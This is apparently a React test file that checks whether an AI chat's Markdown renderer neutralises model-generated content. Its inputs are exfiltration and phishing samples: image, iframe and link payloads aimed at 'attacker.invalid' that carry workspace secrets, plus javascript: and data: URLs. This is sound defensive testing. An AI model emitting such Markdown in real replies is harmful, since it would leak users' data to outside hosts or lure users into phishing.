import {
  AssistantRuntimeProvider,
  MessagePrimitive,
  ThreadPrimitive,
  useLocalRuntime,
} from '@assistant-ui/react'
import type { ChatModelAdapter, ThreadMessageLike } from '@assistant-ui/react'
import { render, screen, waitFor } from '@testing-library/react'
import type { PropsWithChildren } from 'react'
import { describe, expect, it } from 'vitest'
import { MarkdownText } from './MarkdownText'

const noOpAdapter: ChatModelAdapter = {
  async* run() {},
}

function RuntimeProvider({
  children,
  markdown,
}: PropsWithChildren<{ markdown: string }>) {
  const messages: ThreadMessageLike[] = [{
    role: 'assistant',
    content: [{ type: 'text', text: markdown }],
    status: { type: 'complete', reason: 'stop' },
  }]
  const runtime = useLocalRuntime(noOpAdapter, { initialMessages: messages })

  return (
    <AssistantRuntimeProvider runtime={runtime}>
      {children}
    </AssistantRuntimeProvider>
  )
}

function MarkdownMessage() {
  return <MessagePrimitive.Parts components={{ Text: MarkdownText }} />
}

function renderModelMarkdown(markdown: string) {
  return render(
    <RuntimeProvider markdown={markdown}>
      <ThreadPrimitive.Messages
        components={{ Message: MarkdownMessage }}
      />
    </RuntimeProvider>,
  )
}

describe('ai chat Markdown trust boundary', () => {
  it('does not create resource-loading elements from model-generated Markdown', async () => {
    const { container } = renderModelMarkdown([
      '![tracking pixel](https://attacker.invalid/pixel?workspace=secret)',
      '<img src="https://attacker.invalid/raw-pixel">',
      '<iframe src="https://attacker.invalid/frame"></iframe>',
    ].join('\n\n'))

    await waitFor(() => {
      expect(screen.getByText('tracking pixel')).toBeTruthy()
    })

    expect(container.querySelector('img, iframe, object, embed, audio, video, source')).toBeNull()
  })

  it('keeps every model-authored external destination inert', async () => {
    renderModelMarkdown([
      '[script link](javascript:alert(document.domain))',
      '[data link](data:text/html,unsafe)',
      '[protocol-relative link](//attacker.invalid/phish)',
      '[ambiguous HTTPS link](https:attacker.invalid/phish)',
      '[credential link](https://developer.huawei.com@attacker.invalid/phish)',
      '[documentation](https://developer.huawei.com/consumer/cn/cangjie/)',
      '[uppercase HTTPS](HTTPS://example.com/docs)',
      '[encoded learner code](https://attacker.invalid/?code=private-workspace-value)',
      '[local tour](/tour)',
      '[local query exfiltration](/tour?code=private-workspace-value)',
      '[internal endpoint](/api/ai-gateway/metadata?code=private-workspace-value)',
    ].join('\n\n'))

    await waitFor(() => {
      expect(screen.getByText('documentation')).toBeTruthy()
    })

    expect(screen.getByText('script link').closest('a')).toBeNull()
    expect(screen.getByText('data link').closest('a')).toBeNull()
    expect(screen.getByText('protocol-relative link').closest('a')).toBeNull()
    expect(screen.getByText('ambiguous HTTPS link').closest('a')).toBeNull()
    expect(screen.getByText('credential link').closest('a')).toBeNull()

    expect(screen.getByText('documentation').closest('a')).toBeNull()
    expect(screen.getByText('uppercase HTTPS').closest('a')).toBeNull()
    expect(screen.getByText('encoded learner code').closest('a')).toBeNull()

    expect(screen.getByText('local tour').closest('a')).toBeNull()
    expect(screen.getByText('local query exfiltration').closest('a')).toBeNull()
    expect(screen.getByText('internal endpoint').closest('a')).toBeNull()
  })
})
